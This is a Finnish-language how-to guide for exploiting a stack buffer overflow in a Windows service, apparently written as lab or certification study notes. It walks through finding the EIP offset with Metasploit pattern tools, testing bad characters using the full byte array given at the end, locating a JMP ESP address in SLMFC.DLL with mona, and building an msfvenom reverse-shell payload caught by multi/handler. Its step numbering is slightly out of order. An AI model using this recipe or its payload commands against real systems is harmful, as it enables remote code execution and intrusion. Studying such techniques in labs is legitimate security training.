How to BOF

1. Aja työpöydällä oleva python skripti annettua exe:ä/DLL vasten

2. Selvitä noin arvio että missä kohtaa SIGSEV tapahtuu

3. Luo uniikki stringi patter_creatella (Niin pitkä kuin mitä oli fuzzerin viimeisin arvo)
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2900
	
4. Aseta luotu stringi fuzzeriin arvoksi ja aja se nyt palvelua vasten
	Tulee joku virhe ilmoitus, esim "Access violation when executing [39694438]"
	
5. Kopioi nyt EIP rekisterin sen hetkinen arvo (Sama kuin virheilmoituksessa)
	EIP 39694438
	
6. Pattern_Creatella etsi nyt BoF:in alku
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2900 -q 39694438
		[*] Exact match at offset 2606
		
7. Vaihtamalla nyt payloadiksi 2606 A:ta + 4 B:tä ja vaikka 90 C:tä voidaan varmistaa että pitikö arvio kutinsa
	string="A"*2606+"B"*4+"C"*90
		EIP on "42424242" ja ESP on täynnä "43434343" rivejä
		
8. Seuraavaksi tulee tarkastaa badcharit, eli bitit jotka saattavat rikkoa payloadin.
	Korvaa nyt C:t badchars muuttujalla joka sisältää kaikki mahdolliset bitti arvot x01 - xff. (0x00 on aina paha)
	
9. Ajamalla badchar skriptin ekaa kertaa, huomaamme että ESP:ssä tapahtuu leikkaus arvojen 09 ja 29 välissä. (69202909) MUISTA LITTLE ENDIAN!
	Seuraava merkki x09 jälkeen on x0a, joten poistamme sen ja ajamme skriptin uudelleen.
	
10. Badcharia ajetaan niin kauan kunnes kaikki annetut merkit löytyvät rekisteristä.
	Tässä tapauksessa 0x0D oli vielä pahis. Badcharit ovat siis: 0x00, 0x0a, 0x0d
	
11. Etsiäksesi luotettavan JMP ESP komennon, käytä immunityssä komentoa "!mona modules" ja etsi rivi jossa kaikki on falsea, paitsi vika sarake
		Top        | Size       | Rebase  | SafeSEH |   ASLR  | NXCompat | OS Dll | Version, Modulename & Path
		0x5f4f4000 | 0x000f4000 | False   | False   |   False |  False   | True   | 6.00.8063.0 [SLMFC.DLL] (C:\Windows\system32\SLMFC.DLL)
		
13. Ensin on kuitenkin vielä muutettava JMP ESP binääriksi, jotta sitä voidaan hakea Monan avulla. Tähän käytetään nasm_shell.rb:tä.
	/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
		nasm > jmp esp
			00000000  FFE4              jmp esp
			
12. Etsi paikannetusta DLL:stä Monalla FFE4 vastaava osoite
	!mona find -s "\xFF\xE4" -m "SLMFC.DLL"

13. Valitse tuloksista osoite joka ei sisällä aikasemmin havaittuja badchareja, sekä tarkista immunityssä että osoite todella sisältää JMP ESP!
	0x5f4a358f : "\xFF\xE4" |  {PAGE_READONLY} [SLMFC.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.8063.0 (C:\Windows\system32\SLMFC.DLL)

14. Tarkista vielä että osoitteessa 0x5f4a358f on oikeasti JMP ESP
	Go to -> Expression

15. Kokeile muokkaamalla payloadiksi nyt "A"*2606 + "\x8f\x35\x4a\x5f" + "C" * 500, ESP:ssä oleva osoite pitäisi osoittaa nyt C stacking alkuun!
		Huomaa että osoite 0x5f4a358f on muutettava little endianiksi!
		
16. Luo shellcode venomilla alla olevalla loitsulla. Muista vaihtaa badcharit!
	msfvenom -p windows/shell_reverse_tcp LHOST=<ip-osoite> LPORT=60606 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
	
17. Nyt kopioi saatu shellcode python skriptiimme ja lisää vielä sitä ennen 8 NOP komentoa, koska Shikata_ga_nai vaatii sen. 
	Muista myös että shellcode tulee laittaa sulkujen sisään, kuten badcharit alusssa laitettiin.
	"\x90" * 8 

18. Käynnistä Metaslpoitin multi/handler ja nauti shellistäsi!
















badchars=(
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

